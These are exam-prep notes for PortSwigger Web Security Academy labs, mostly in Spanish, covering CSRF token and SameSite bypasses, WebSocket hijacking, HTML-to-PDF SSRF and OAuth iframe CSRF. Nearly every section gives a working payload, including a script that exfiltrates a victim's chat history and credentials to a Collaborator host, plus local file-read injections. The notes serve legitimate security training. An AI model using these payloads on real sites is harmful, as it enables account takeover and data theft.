
La falsificaci√≥n de solicitud entre sitios (tambi√©n conocida como CSRF) es una vulnerabilidad de seguridad web que permite a un atacante inducir a los usuarios a realizar acciones que no tienen intenci√≥n de realizar. Permite a un atacante eludir parcialmente la pol√≠tica de mismo origen, que est√° dise√±ada para evitar que diferentes sitios web interfieran entre s√≠.

<hr>

- **Strict üîí ‚Üí Solo dentro del mismo sitio. M√°s seguro, pero puede romper algunas funcionalidades.**
- **Lax üåê ‚Üí Permite cookies en enlaces, pero bloquea en formularios y scripts para evitar ataques CSRF.**
### Payloads 

```js
//LAB: CSRF sin defensas
//POST /my-account/change-email
	//engagement tools>Generate CSRF POC.
	//store & deliver exploit to victim - SERVER-EXPLOIT

//LAB: CSRF validaci√≥n Token Depends of method request (ex:POST->GET)
	//Capture request to change email Change Request method to GET
	//GET /my-account/change-email?email=attacker@evil.net
	//Right click > engagement tools > generate CSRF POC
	//store & deliver exploit to victim

//LAB: CSRF validaci√≥n Token Depends presencia Token (delete param CSRF=)
	//POST /my-account/change-email //(sin el token CSRF)
	//Engagement Tools>Generate CSRF POC. "quitamos el token csrf"
	//Store & deliver exploit to victim.

//LAB: CSRF no se vincula a session user unico (CSRF's globales sin validar para un unico user cada token) - reutilizacion de token con otros usuarios. `STAGE 2`
	//Ingresar como carlos y change-email
	//My-account to get Hidden CSRF in dom 
	//POST /my-account/change-email //con token CSRF hidden (actualizar la pagina para tomar un token CSRF Nuevo)
	//Engagement Tools>Generate CSRF POC & store-deliver exploit to victim
	//y el problema recae en que como user carlos con mi token csrf hidden, puedo
	//hacer que un user Viewer cambie su email con mi mismo token, ya que es un token global que no est√° anclado a la session de un usuario unico.


//LAB: # where token is tied to non-session cookie `LastSearchTerm` `Set-Cookie` 
// Token vinculado con una cookie que no es la de session.
//STAGE 2  
	//lo que pasa es que la cookie facilmente es manipulable, entonces el CSRF es expuesto a ser modificadop por uno -> CSRF=fake
	//Es importante tener en cuenta que si la barra de busqueda del home page la podemos modificar para modificar en la response la cookie, entonces el ataque puede venir por aqu√≠..
	Consulta para inyectar el fake: 
		//GET /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
		//esa la mandamos y veremos reflejada la csrfKey con el valor de nuestra csrfKey, de donde tomamos la csrfKey? de ahi mismo de la request o en la request de CHANGE EMAIL TAMBIEN EST√Å AHI LA CSRFKey y la CSRF  
		//Generate CSRF POC: `De la REQUEST CHANGE EMAIL y simplemente eliminamos el -> <script></scrip>..`
	//en este caso la app nombra el csrf de la cookie no como csrfkey=token sino como csrf=token (pero si es csrfKey no pasa nada), es importante cambiarlo sino podr√≠a generar un error durante el ataque, adem√°s en lugar de las tags scripts las eliminamos y dejamos el tag <img> ->
//<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
****
SUPER IMPORTANTE: STAGE 2
>>> During BSCP **Exam** set the email change value to that of the exploit server **hacker@exploit-server.net** email address. Then you can change the administrator password with the reset function.
****
------
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://ID-LAB.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tester2&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="3hLcSGU19e160bjtlVhZPVlEMhDEuC0x" />
      <input type="submit" value="Submit request" />
    </form>
		<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>

//LAB: CSRF Token Duplicated in Cookie: `LastSearchTerm` `Set-Cookie` STAGE 2 
	//AQUI SI ES CSRF. 
	//Es un lab muy similar al de arriba sin embargo aqui nos centraremos en poner un csrf en ambas partes ya veremos cuales: 
	//?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
	//Y luego <img> para el CSRF poc ser√° asi: 
	//--> <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
	//nos vamos a change email generamos el csrf POC y LO DEJAMOS ASI: e importante dejar el mismo token en ambas partes. 

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://ID-LAB.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker5&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="FAKE-SAME-TOKEN" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://ID-LAB.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=FAKE-SAME-TOKEN%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>


//LAB: CSRF Bypass SameSite=Lax anulacion Method Override: `_method:POST`
	* SameSite=Lax
	//GET /my-account/change-email?email=wiener%40normal-user.net&_method=POST
	<script>
    document.location = 'https://ID-LAB.web-security-academy.net/my-account/change-email?email=test%40normal-user.net&_method=POST';
	</script>


//LAB: CSRF Bypass SameSite strict redirection side client: `path traversal open redirect con un CSRF`
	* SameSite=Strict
	//encontramos un redirect en el source js del lab, y se podia meter path traversal
	//GET /post/comment/confirmation?postId=1/../../my-account/change-email?email=test%40normal-user.net
	<script>
document.location = "https://ID-LAB.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=test%40normal-user.net%26submit=1";
	</script>

//LAB: CSWH - SameSite strict bypass via Sibling Domain: STAGE 1/2
	//GET /resources/js/chat.js HTTP/2 //contiene un Access-Control-Allow-Origin, con un sibling domain: 
	//https://cms.ID-LAB-web-security-academy.com > tiene un POST /login
	//XSS En param Body: username=<scri..>alert(1)</scri...>&password=...
	<script>
    var ws = new WebSocket('wss://ID-LAB.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://BURP-COLLAB.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
	</script>
	//TODO ESE PAYLOAD encoded a URL en el param body username.
	//Asi podemos exfiltrar el historial y creds del user victim.
	//ya luego es cuesti√≥n de tomar ese endpoint y hacer un CSRF PoC y enviarselo a la victima, y a nuestro COLLAB nos llegar√° el historial con la credencial de carlos. 


//LAB: CSRF SameSite=Lax Bypass via Cookie Refresh - STAGE 1,2 `social-login`
	//Endoint de change-email claro. tal como dice el csrf poc de abajo->
/*
> Observa si visitas /social-login, esto inicia autom√°ticamente el flujo OAuth completo. Si todav√≠a tienes una sesi√≥n iniciada con el servidor OAuth, todo esto sucede sin ninguna interacci√≥n., y en el historial del proxy, observa que cada vez que completas el flujo OAuth, el sitio objetivo establece una nueva cookie de sesi√≥n, incluso si ya hab√≠as iniciado sesi√≥n.
> Elude el bloqueador de ventanas emergentes, para inducir a la v√≠ctima a hacer clic en la p√°gina y s√≥lo abre la ventana emergente una vez que la v√≠ctima ha hecho clic, con el siguiente JavaScript. El c√≥digo JavaScript del exploit primero refresca la sesi√≥n de la v√≠ctima forzando a su navegador a visitar /social-login, y luego env√≠a la solicitud de cambio de correo electr√≥nico tras una breve pausa. Entrega el exploit a la v√≠ctima.
> REALMENTE EL EMAIL LO PODEMOS DEJAR POR EL EMAIL CLIENT DEL EXPLOIT SERVER PARA UN ATAQUE REAL EN EL EXAM BSCP!!!!
*/
<form method="POST" action="https://ID-LAB.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned2@portswigger.net">
</form>
<p>Click Me!</p>
<script>
    window.onclick = () => {
        window.open('https://ID-LAB.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
	//Super important cambiar el *correo* por uno nuevo para que el ataque pueda darse
	//Cuando hagamos clic en alg√∫n lugar de la p√°gina de exploits, abrir√° otra ventana a /social-login, esto asignar√° una nueva cookie de sesi√≥n, que nos permite tener 120 segundos para enviar una solicitud POST para actualizar la direcci√≥n de correo electr√≥nico.
	

//LAB: CSRF where <meta> Referer validation depends on header being present
* Si el stage 1 del examen no fue un exploit interactivo, seguramente el stage 2 si lo sea, y podemos usar este para tomar acceso administrativo simplemente enviandoselo a la victima admin. ->
	//Algunas apps usan header referer como defensa->CSRF, pero una mierda es.
	* <meta name="referrer" content="never"> //dentro de la tag <body>
	//GENEREATE CSRF POC y dejamos la tag <meta> dentro de <body>
	<html>
	  <!-- CSRF PoC - generated by Burp Suite Professional -->
	  <body>
	    <meta name="referrer" content="never">
	    <form action="https://ID-LAB.web-security-academy.net/my-account/change-email" method="POST">
	      <input type="hidden" name="email" value="ATTACKER&#64;normal&#45;user&#46;net" />
	      <input type="submit" value="Submit request" />
	    </form>
	    <script>
	      history.pushState('', '', '/');
	      document.forms[0].submit();
	    </script>
	  </body>
	</html>
	//Super importante cambiar el email, para que el ataque se de.

//LAB: CSRF with broken Referer validation -  `Referrer-Policy: unsafe-url`
	//si pillo una app que no implementa tokens csrf y no pillo nada m√°s adem√°s de cambiar un email entonces el fucking ataque va por aqui o por un csrf basico.
	//importante valida bien el history.pushstate
	//En este caso header Referer no valida el dominio correctamente,
	//solo valida que contenga la palabra correcta del dominio. 
	<html>
	  <!-- CSRF PoC - generated by Burp Suite Professional -->
	  <body>
	    <form action="https://ID-LAB.web-security-academy.net/my-account/change-email" method="POST">
	      <input type="hidden" name="email" value="attacker5&#64;normal&#45;user&#46;net" />
	      <input type="submit" value="Submit request" />
	    </form>
	    <script>
	      history.pushState('', '', '/?ID-LAB.web-security-academy.net');
	      document.forms[0].submit();
	    </script>
	  </body>
	</html>
	//Actualizar el correo claramente. 
	//en server exploit dejamos la regla: `en el HEAD`
	Referrer-Policy: unsafe-url
	//Y listo solved y que coma monda el planeta entero. 
```


<hr> 

### LAB: Performing CSRF exploits over GraphQL

### CSRF Is Logged In `POST /refreshPassword`

> If cookie with the **isloggedin** name is _**identified**_, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low privilege user, CSRF where token is not tied to user session.

```html
POST /refreshpassword HTTP/1.1
Host: TARGET.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://TARGET.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
Referer: https://TARGET.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=TOKEN&username=administrator
```

![[Pasted image 20250219161347.png]]


### HTML to PDF

> **Identify** a PDF download function and the `source code` uses `JSON.stringify` to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial `source code` for JavaScript on the target `downloadReport.js`.

```js
function downloadReport(event, path, param) {

body: JSON.stringify({
  [param]: html
  }
  )
  
```

> **Note:** The `<div>` tag defines a division or a section in an HTML document. The
> 
> tag is used as a container for HTML elements - which is then styled with CSS. [z3nsh3ll explain HTML DIV demarcation and SPAN different ways to style the elements.](https://youtu.be/5djtMMciBlw)

```html
<div><p>Report Heading by <img src="https://OASTIFY.COM/test.png"></p>
```

> Identify file download HTML-to-PDF convert function on target is vulnerable.

```js
<script>
	document.write('<iframe src=file:///etc/passwd></iframe>');
</script>
```

> Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).

[PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)

> Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as `wkhtmltopdf` to read local file, resulting in [SSRF to Local File Read Exploit in Hassan's blog](http://hassankhanyusufzai.com/SSRF-to-LFI/).

> Thehackerish showing wkHTMLtoPDF exploitation using [root-me.org - Gemini-Pentest-v1](https://www.root-me.org/) CTF lab in the video [Pentest SSRF Ep4](https://youtu.be/Prqt3N5QU2Q?t=345) by editing the name of the admin profile with HTML content it is then generated server side by including remote or local files.

![[Pasted image 20250219163530.png]]

```html
<html>
 <body>
  <script>
   x = new XMLHttpRequest;
   x.onload = function() {
    document.write(this.responseText)
   };
   x.open("GET", "file:///home/carlos/secret");
   x.send();
  </script>
 </body>
</html>
```

> JSON POST request body containing the HTMLtoPDF formatted payload to read local file.

```json
{
 "tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
}
```

![[Pasted image 20250219163715.png]]

> Above the display name is injected with `HTML` payload and on export the HTML-to-PDF converter perform SSRF.

> The PDF creator: wkhtmltopdf 0.12.5 is known for SSRF vulnerabilities, and in [HackTricks - Server Side XSS - Dynamic PDF](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) there is cross site scripting and server side exploits documented.

### OAuth - IFRAME CSRF

> oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.

[![csrf](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf.png)

> Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. **Drop** the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the `src` attribute points to the URL you just copied.

```html
<iframe src="https://TARGET.net/oauth-linking?code=STOLEN-CODE"></iframe>
```

